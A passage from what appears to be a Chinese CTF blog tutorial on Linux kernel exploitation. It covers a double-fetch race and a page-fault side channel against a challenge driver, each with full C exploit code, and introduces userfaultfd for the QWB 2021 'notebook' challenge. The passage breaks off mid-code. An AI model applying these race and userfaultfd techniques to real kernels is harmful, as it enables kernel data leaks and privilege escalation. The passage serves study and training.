class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x1337</span><br>         &amp;&amp; !_chk_range_not_ok(v2, <span class="hljs-number">16LL</span>, *(__readgsqword(&amp;current_task) + <span class="hljs-number">0x1358</span>))<span class="hljs-comment">// check1:检查传递结构体的范围是否小于0x7ffff...</span><br>         &amp;&amp; !_chk_range_not_ok(*v5, *(v5 + <span class="hljs-number">8</span>), *(__readgsqword(&amp;current_task) + <span class="hljs-number">0x1358</span>))<span class="hljs-comment">// check2:检查结构体内容的范围是否小于0x7ffff...</span><br>         &amp;&amp; *(v5 + <span class="hljs-number">8</span>) == <span class="hljs-built_in">strlen</span>(flag) )         <span class="hljs-comment">// check3:检查长度是否等于flag</span><br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(flag); ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *(*v5 + i) != flag[i] )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">22LL</span>;<br>    &#125;<br>    printk(<span class="hljs-string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">14LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以看到他是首先给出了flag的地址，然后再与我们传入的数据结构进行比较，其中有三个check</p><ol><li>检查我们的传入数据结构是否位于用户态（这里的(&amp;current_task)+0x1358的值是可以通过动调知道）</li><li>检查我们传入数据结构指向的块是否位于用户态</li><li>检查指向块的长度是否位于用户态</li></ol><p>检查完毕后再来查看我们传入的块里面的数据是否等于flag值，如果等于则打印在内核输出当中<br>下面就是本次讲解的例题手法</p><h3 id="1-double-fetch"><a href="#1-double-fetch" class="headerlink" title="1.double fetch"></a>1.double fetch</h3><p>这里的doube fetch就是两次取的意思，我们可以知道，在内核检测数据的过程中，以及到达开始比较的过程当中，这一段缝隙对于人来说可能是十分短且可以忽略的地方，而对于程序来说那就不是这样了，我们可以充分利用这段间隙，在该地址通过检测的情况下再立刻修改他指向的值，这样就可以绕过检测，这里给出a3师傅的图</p><p><img src="https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png"></p><p>这里值得注意的一点就是再我们使用<code>pthread</code>函数簇的时候，记得编译选项加上<code>-lpthread</code><br>我们的exp如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">pthread_t</span> compete_thread;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x30</span>] = <span class="hljs-string">&quot;peiwithhao&quot;</span>;<br><span class="hljs-type">int</span> competition_time = <span class="hljs-number">0x1000</span>, status = <span class="hljs-number">1</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> real_addr;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">void</span>* flag_addr;<br>  <span class="hljs-type">size_t</span> flag_len;<br>&#125;flag = &#123;.flag_addr = buf, .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">competition_thread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>  <span class="hljs-keyword">while</span>(status)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; competition_time ; i++)&#123;<br>      flag.flag_addr = real_addr;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, <span class="hljs-number">2</span>);<br>  ioctl(fd, <span class="hljs-number">0x6666</span>);<br>  system(<span class="hljs-string">&quot;dmesg | grep flag &gt; addr.txt&quot;</span>);<br>  <span class="hljs-type">int</span> addr_fd = open(<span class="hljs-string">&quot;/addr.txt&quot;</span>, <span class="hljs-number">0</span>);<br>  lseek(addr_fd, <span class="hljs-number">31</span>, SEEK_SET);<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">char</span>* temp = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>  buf[read(addr_fd, buf, <span class="hljs-number">0x10</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  <span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;real_addr);<br>  PRINT_ADDR(<span class="hljs-string">&quot;flag&quot;</span>, real_addr);<br><br>  pthread_create(&amp;compete_thread, <span class="hljs-literal">NULL</span>, competition_thread, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">while</span>(status)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; competition_time ; i++)&#123;<br>      flag.flag_addr = buf;<br>      ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br>    &#125;<br>    system(<span class="hljs-string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);<br>    <span class="hljs-type">int</span> result_fd = open(<span class="hljs-string">&quot;/result.txt&quot;</span>, <span class="hljs-number">0</span>);<br>    read(result_fd, temp, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(temp, <span class="hljs-string">&quot;flag&#123;&quot;</span>))&#123;<br>      status = <span class="hljs-number">0</span>;<br>    &#125;<br><br>  &#125;<br>  pthread_cancel(compete_thread);<br>  info_log(<span class="hljs-string">&quot;finish&quot;</span>);<br>  system(<span class="hljs-string">&quot;dmesg | grep flag&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-侧信道"><a href="#2-侧信道" class="headerlink" title="2. 侧信道"></a>2. 侧信道</h3><p>顾名思义，其就是使用一种完全偏离正常解题思路的一种攻击手段，譬如更加像物理黑客那样达成自己的目的，有的侧信道解法甚至使用到加解密判断中运行时长的差别来判断整体程序的运行。本题同样存在侧信道解法。</p><p>我们在上面都接触到，只有题目中传递到了正确的flag值我们才可以获取flag，但是就这么个检查flag的过程是一个字节一个字节检测的，所以说我们可以采用下面这个思路：</p><ol><li>我们每次传递一定长度的flag值，并逐位进行爆破</li><li>每次判断正确的办法也很简单，如果我们传递了错误的值，程序就会正常退出，如果我们传递正确的值该怎么办呢，这里给出解答，我们可以mmap出一页范围，然后将部分flag置于页末尾，那么如果我们flag的最后一个符号匹配，程序就会接着往后面访问判断是否匹配，但是这就到了下一页，其大概率会出现访问panic</li></ol><p>大致情况如下：</p><img src="/2023/06/24/Linux-Kernel-0x02-Practice/cxd.png" class=""><p>如下exp，我们可以通过传递参数的方式来猜：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">pthread_t</span> compete_thread;<br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">int</span> competition_time = <span class="hljs-number">0x1000</span>, status = <span class="hljs-number">1</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> real_addr;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">void</span>* flag_addr;<br>  <span class="hljs-type">size_t</span> flag_len;<br>&#125;flag = &#123;.flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">competition_thread</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>  <span class="hljs-keyword">while</span>(status)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; competition_time ; i++)&#123;<br>      flag.flag_addr = real_addr;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span>&#123;<br><br>  <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">2</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;Usage: ./exp &lt;flag&gt;&quot;</span>);<br>  &#125;<br>  <span class="hljs-type">int</span> flag_len = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>  buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-type">void</span>* flag_addr = buf + <span class="hljs-number">0x1000</span> - flag_len;<br>  <span class="hljs-built_in">memcpy</span>(flag_addr, argv[<span class="hljs-number">1</span>], flag_len);<br>  flag.flag_addr = flag_addr;<br>  ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="例题：强网杯2021线上赛-notebook"><a href="#例题：强网杯2021线上赛-notebook" class="headerlink" title="例题：强网杯2021线上赛-notebook"></a>例题：强网杯2021线上赛-notebook</h2><h3 id="1-userfaultfd基础"><a href="#1-userfaultfd基础" class="headerlink" title="1.userfaultfd基础"></a>1.userfaultfd基础</h3><p>该类技术就是让我们用户来处理本该由内核处理的事件，其中就比如缺页异常等。<br>userfaultfd 机制让在用户控制缺页处理提供可能，进程可以在用户空间为自己的程序定义page fault handler，增加了灵活性，但也可能由于类似FUSE之于内核FS的问题(调用层次加深)而影响性能。</p><p>他被实现一个系统调用供我们使用,我们可以查看其帮助手册，如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell">SYNOPSIS<br>       #include &lt;sys/types.h&gt;<br>       #include &lt;linux/userfaultfd.h&gt;<br><br>       int userfaultfd(int flags);<br><br>       Note: There is no glibc wrapper for this system call; see NOTES.<br><br>DESCRIPTION<br>       userfaultfd() creates a new userfaultfd object that can be used for delegation of page-fault handling to a user-space application, and returns a file descriptor that refers to the new object.  The new userfaultfd ob‐<br>       ject is configured using ioctl(2).<br><br>       Once the userfaultfd object is configured, the application can use read(2) to receive userfaultfd notifications.  The reads from userfaultfd may be blocking or non-blocking, depending on the value of flags  used  for<br>       the creation of the userfaultfd or subsequent calls to fcntl(2).<br><br>       The following values may be bitwise ORed in flags to change the behavior of userfaultfd():<br><br>       O_CLOEXEC<br>              Enable the close-on-exec flag for the new userfaultfd file descriptor.  See the description of the O_CLOEXEC flag in open(2).<br><br>       O_NONBLOCK<br>              Enables non-blocking operation for the userfaultfd object.  See the description of the O_NONBLOCK flag in open(2).<br><br>       When the last file descriptor referring to a userfaultfd object is closed, all memory ranges that were registered with the object are unregistered and unread events are flushed.<br><br>   Usage<br>       The userfaultfd mechanism is designed to allow a thread in a multithreaded program to perform user-space paging for the other threads in the process.  When a page fault occurs for one of the regions registered to the<br>       userfaultfd object, the faulting thread is put to sleep and an event is generated that can be read via the userfaultfd file descriptor.  The fault-handling thread reads events from this file descriptor  and  services<br>       them using the operations described in ioctl_userfaultfd(2).  When servicing the page fault events, the fault-handling thread can trigger a wake-up for the sleeping thread.<br><br>       It  is  possible  for the faulting threads and the fault-handling threads to run in the context of different processes.  In this case, these threads may belong to different programs, and the program that executes the<br>       faulting threads will not necessarily cooperate with the program that handles the page faults.  In such non-cooperative mode, the process that monitors userfaultfd and handles page faults needs to  be  aware  of  the<br>       changes in the virtual memory layout of the faulting process to avoid memory corruption.<br><br>       Starting  from  Linux  4.11, userfaultfd can also notify the fault-handling threads about changes in the virtual memory layout of the faulting process.  In addition, if the faulting process invokes fork(2), the user‐<br>       faultfd objects associated with the parent may be duplicated into the child process and the userfaultfd monitor will be notified (via the UFFD_EVENT_FORK described below) about the file descriptor associated with the<br>       userfault  objects  created  for the child process, which allows the userfaultfd monitor to perform user-space paging for the child process.  Unlike page faults which have to be synchronous and require an explicit or<br>       implicit wakeup, all other events are delivered asynchronously and the non-cooperative process resumes execution as soon as the userfaultfd manager executes read(2).  The userfaultfd manager should carefully synchro‐<br>       nize calls to UFFDIO_COPY with the processing of events.<br><br></code></pre></td></tr></table></figure><p>userfaultfd()函数被使用来创建一个结构体，用作用户空间的缺页处理，并返回一个文件描述符，并且该结构体使用ioctl进行配置,配置过后我们就可以使用read函数读取其中的userfaultfd消息，该行为是否会被阻塞取决于创建uffd结构体时的flag值或连续的<code>fcntl</code>调用</p><p>我们要使用他，首先需要获得上面这样一个结构体，使用如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> uffd = syscall(_NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br></code></pre></td></tr></table></figure><p>获得这样一个结构体后，我们需要使用ioctl来进行之后的配置、注册内存区域、或者说是缺页处理，其中ioctl的命令参数如下：</p><ul><li>UFFDIO_REGESTER: 注册一个监视区域</li><li>UFFDIO_COPY: 上面的区域出现缺页后，使用该命令来像缺页的地址拷贝自定义数据</li></ul><p>然后我们需要使用mmap来映射出一片匿名区域，然后将其定义为监视区，再使用iotctl注册该区域</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 注册时要用一个struct uffdio_register结构传递注册信息:</span><br><span class="hljs-comment">// struct uffdio_range &#123;</span><br><span class="hljs-comment">// __u64 start;    /* Start of range */</span><br><span class="hljs-comment">// __u64 len;      /* Length of range (bytes) */</span><br><span class="hljs-comment">// &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// struct uffdio_register &#123;</span><br><span class="hljs-comment">// struct uffdio_range range;</span><br><span class="hljs-comment">// __u64 mode;     /* Desired mode of operation (input) */</span><br><span class="hljs-comment">// __u64 ioctls;   /* Available ioctl() operations (output) */</span><br><span class="hljs-comment">// &#125;;</span><br><br>   <span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">      demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">      actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">      the userfaultfd. */</span><br><br><br>addr = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>)<br><span class="hljs-comment">// addr 和 len 分别是我匿名映射返回的地址和长度，赋值到uffdio_register</span><br>uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>uffdio_register.range.len = len;<br><span class="hljs-comment">// mode 只支持 UFFDIO_REGISTER_MODE_MISSING</span><br>uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br><span class="hljs-comment">// 用ioctl的UFFDIO_REGISTER注册</span><br>ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register);<br><br></code></pre></td></tr></table></figure><p>然后我们就需要启动一个线程进行轮询，来捕获对于我们该页的异常</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 主进程中调用pthread_create创建一个fault handler线程</span><br>pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-type">void</span> *) uffd);<br><br></code></pre></td></tr></table></figure><blockquote><p>一个自定义的线程函数举例如下，这里处理的是一个普通的匿名页用户态缺页，我们要做的是把我们一个已有的一个page大小的buffer内容拷贝到缺页的内存地址处。用到了poll函数轮询uffd，并对轮询到的UFFD_EVENT_PAGEFAULT事件(event)用拷贝(ioctl的UFFDIO_COPY选项)进行处理。</p></blockquote><p>上面一段是我引用Jcix师傅的原话，侵删~~</p><p>下面就是我们的<code>fault_handler_thread</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c">fault_handler_thread(<span class="hljs-type">void</span> *arg)<br>&#123;<br>   <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>   <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>   <span class="hljs-type">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>   <span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>   <span class="hljs-type">ssize_t</span> nread;<br><br>   uffd = (<span class="hljs-type">long</span>) arg;<br><br>   <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>   <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) &#123;<br>       page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                   MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>       <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>           errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">      file descriptor 